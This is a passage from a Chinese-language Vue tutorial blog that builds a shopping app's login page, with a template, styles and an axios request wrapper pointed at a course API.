class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"login"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 头部 NavBar --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"尊敬的用户，请登录"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 主体部分 自定义 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"container"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h3</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">手机号登录</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h3</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">未注册的手机号登录后将自动注册</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"inp"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">maxlength</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"11"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入手机号码"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span></span><span class="line"><span style="color: #D4D4D4">          /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"inp"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">maxlength</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"5"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入图形验证码"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span></span><span class="line"><span style="color: #D4D4D4">          /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"@/assets/code.png"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"inp"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入短信验证码"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">获取验证码</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"login-btn"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">登录</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"LoginIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.container</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">49px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">29px</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">h3</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">26px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">p</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#b8b8b8</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.form-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#f3f1f2</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">8px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.inp</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">32px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">94px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">31px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">button</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">31px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">13px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#cea26a</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">transparent</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">padding-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">9px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.login-btn</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">42px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">39px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">linear-gradient</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">90deg</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#ecb53c</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#ff9211</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">39px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">box-shadow</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">rgba</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0.1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">letter-spacing</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>页面效果如下：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281818338.png" alt="image-20240828181803280" style="zoom: 80%;"><p>图形验证码暂时写死，短信验证码暂时不作处理</p><h3 id="完善登录逻辑"><a class="markdownIt-Anchor" href="#完善登录逻辑"></a> 完善登录逻辑</h3><p>登录页面一共有三个请求需要发送，图形验证码、短信验证码和登录请求。我们使用 axios 来请求后端接口，一般都会对 axios 进行一些配置（配置基础地址，请求响应拦截器等），于是封装 axios 为一个 request 模块，便于维护。以后使用 axios 都是创建实例去请求，这样多个实例相互独立，互不干扰。</p><ul><li><a href="https://www.axios-http.cn/docs/instance">axios 中文文档</a></li></ul><p>新建 request.js 于 utils 包下，创建一个 axios 实例（cv 中文文档中的实例和拦截器进行改造）：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">axios</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"axios"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 创建axios实例</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">instance</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">axios</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">create</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 查看接口文档改造</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">baseURL:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"http://smart-shop.itheima.net/index.php?s=/api"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">timeout:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5000</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">headers:</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">platform:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"h5"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">});</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 自定义配置 - 请求/响应 拦截器 （如果希望不污染原本的axios需要将axios改为instance实例）</span></span><span class="line"><span style="color: #6A9955">// 添加请求拦截器</span></span><span class="line"><span style="color: #9CDCFE">instance</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">interceptors</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 在发送请求之前做些什么</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 对请求错误做些什么</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Promise</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reject</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 添加响应拦截器</span></span><span class="line"><span style="color: #9CDCFE">instance</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">interceptors</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 2xx 范围内的状态码都会触发该函数。</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 超出 2xx 范围的状态码都会触发该函数。</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 对响应错误做点什么</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Promise</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reject</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 导出配置好的示例</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">instance</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>响应器中，response.data 原本为 response，这里改为上文是因为 axios 默认会对响应多包装一层 data，所以这里需要取出 data</p><p>接着回到登录页面 index.vue 上，导入 request 模块，异步检查一下：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"LoginIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/captcha/image"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">);</span></span><span 